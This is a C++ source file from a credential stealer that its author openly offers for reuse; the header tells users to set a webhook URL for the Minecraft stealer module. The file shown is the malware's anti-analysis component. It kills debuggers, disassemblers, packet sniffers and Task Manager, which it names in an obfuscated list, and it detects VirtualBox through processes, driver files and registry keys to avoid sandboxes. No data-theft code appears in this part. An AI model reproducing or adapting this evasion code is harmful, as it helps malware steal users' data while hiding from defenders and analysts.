/*

//===================================================//

this stealer was coded by itosted / juvee <--- https://github.com/zjuvee
you can use this code, but i dont take any responsibility for any damage caused.

remember to change the webhook url in the includes/MinecraftStealer.hpp file

pd: give me credits if you use this code in your project. <---- please, dont copy pasted and remove the name

//===================================================//
*/


#include "includes\BLProcess.hpp"
#include "includes\xorstr.hpp"

using namespace std;

/*

// ======================= anticracking =========================//

credits: none lol, i just copy pasted the code from the src folder leaked by the brasilian skiddy boy

*/


// check if the any program blacklisted is running
bool AntiCrack::isProcessRunning(const std::wstring& processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (snapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    if (!Process32First(snapshot, &entry)) {
        CloseHandle(snapshot);
        return false;
    }

    do {
        std::wstring szExeFileW(entry.szExeFile, entry.szExeFile + wcslen(entry.szExeFile) + 1);

        if (wcscmp(szExeFileW.c_str(), processName.c_str()) == 0) {
            CloseHandle(snapshot);
            return true;
        }
    } while (Process32Next(snapshot, &entry));

    CloseHandle(snapshot);
    return false;
}


// close the process if IsProcessRunning returns true
void AntiCrack::closeProcess(const std::wstring& processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (snapshot == INVALID_HANDLE_VALUE) {
        return;
    }

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &entry)) {
        CloseHandle(snapshot);
        return;
    }

    do {
        std::wstring szExeFileW(entry.szExeFile, entry.szExeFile + wcslen(entry.szExeFile) + 1);

        if (wcscmp(szExeFileW.c_str(), processName.c_str()) == 0) {
            HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
            if (processHandle != NULL) {
                TerminateProcess(processHandle, 0);
                CloseHandle(processHandle);
            }
        }
    } while (Process32Next(snapshot, &entry));

    CloseHandle(snapshot);
}


// this is the list of programs that will be closed if they are running
void AntiCrack::checkForCrackingToolsA() {
    std::vector<std::wstring> crackingTools = {
        (xorstr_(L"ida64.exe")), (xorstr_(L"Taskmgr.exe")), (xorstr_(L"Dumpcap.exe")), (xorstr_(L"Wireshark.exe")), (xorstr_(L"SystemInformer.exe")),
        (xorstr_(L"ProcessHacker.exe")), (xorstr_(L"dotPeek64.exe")), (xorstr_(L"ida32.exe")), (xorstr_(L"ida.exe")), (xorstr_(L"reclass.net.exe")),
        (xorstr_(L"reclass.exe")), (xorstr_(L"heyrays.exe")), (xorstr_(L"lighthouse.exe")), (xorstr_(L"cheatengine-x86_64.exe")), (xorstr_(L"classinformer.exe")),
        (xorstr_(L"ida-x86emu.exe")), (xorstr_(L"cffexplorer.exe")), (xorstr_(L"winhex.exe")), (xorstr_(L"hiew.exe")), (xorstr_(L"fiddler.exe")),
        (xorstr_(L"httpdebugger.exe")), (xorstr_(L"httpdebuggerpro.exe")), (xorstr_(L"scylla.exe")), (xorstr_(L"Cheat Engine.exe")),
        (xorstr_(L"ollydbg.exe")), (xorstr_(L"x64dbg.exe")), (xorstr_(L"PE.EXE")), (xorstr_(L"ida.exe")), (xorstr_(L"PEiD.exe")), (xorstr_(L"r2.exe")),
        (xorstr_(L"procexp.exe"))
    };

    for (const std::wstring& tool : crackingTools) {
        if (AntiCrack::isProcessRunning(tool)) {
            closeProcess(tool);
        }
    }
}


// this function check if the process is running in a virtual machine (dont work well lol)
bool AntiCrack::isRunningInVirtualBox() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::wstring pe32_szExeFileW(pe32.szExeFile, pe32.szExeFile + wcslen(pe32.szExeFile) + 1);

            if (_wcsicmp(pe32_szExeFileW.c_str(), (xorstr_(L"VBoxService.exe"))) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);

    if (GetFileAttributes(xorstr_(L"C:\\Windows\\system32\\drivers\\VBoxMouse.sys")) != INVALID_FILE_ATTRIBUTES) {
        return true;
    }

    if (GetFileAttributes(xorstr_(L"C:\\Windows\\system32\\drivers\\VBoxGuest.sys")) != INVALID_FILE_ATTRIBUTES) {
        return true;
    }

    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, (xorstr_(L"SOFTWARE\\Oracle\\VirtualBox Guest Additions")), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }

    return false;
}

